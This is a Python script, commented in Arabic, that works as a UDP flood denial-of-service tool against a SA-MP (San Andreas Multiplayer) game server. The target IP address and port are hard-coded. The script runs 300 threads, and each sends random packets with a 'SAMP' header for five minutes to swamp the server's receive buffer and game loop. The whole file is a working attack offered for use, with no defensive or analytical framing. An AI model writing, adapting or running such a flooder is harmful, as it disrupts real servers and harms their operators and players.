import socket
import random
import threading
import time

# =====================================================================
# === TRAPKING GAME-LOOP & CPU STRESSOR (Advanced UDP/RPC Flooder) ===
# =====================================================================

TARGET_IP = "94.23.168.153"  # IP الهدف
TARGET_PORT = 2343            # بورت اللعبة الفعلي
DURATION = 300                 # مدة الهجوم بالثواني
THREADS_COUNT = 300           # عدد الخيوط لاستغلال Ryzen 9

def gameloop_attack_worker():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + DURATION
    
    # محاكاة بنية حزم المزامنة والطلبات التي تمر مباشرة عبر الـ Game Loop
    # حزم تحتوي على أكواد تحكم وتحديثات وهمية تجبر المعالج على تحليلها
    while time.time() < end_time:
        try:
            # توليد حزم ضغط بكثافة عالية تحاكي تدفق بيانات اللاعبين المكثفة
            # حجم الحزمة مصمم لإرباك طابور استقبال الحزم في نواة السيرفر (Receive Buffer)
            payload_size = random.randint(256, 1024)
            # إضافة بصمة تحاكي ترويسات اللعبة لإجبار الـ Game Loop على معالجتها
            rpc_payload = b'SAMP' + bytes([random.randint(0, 255) for _ in range(4)]) + random._urandom(payload_size)
            
            client.sendto(rpc_payload, (TARGET_IP, TARGET_PORT))
        except:
            pass
            
    client.close()

def main():
    print(f"[*] بدء هجوم استهداف الـ Game Loop والـ CPU على سيرفر SA-MP: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] تفعيل {THREADS_COUNT} خيط لضغط حلقة المعالجة وإحداث ارتفاع في الـ Ping...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=gameloop_attack_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت جلسة ضغط الـ Game Loop.")

if __name__ == "__main__":
    main()
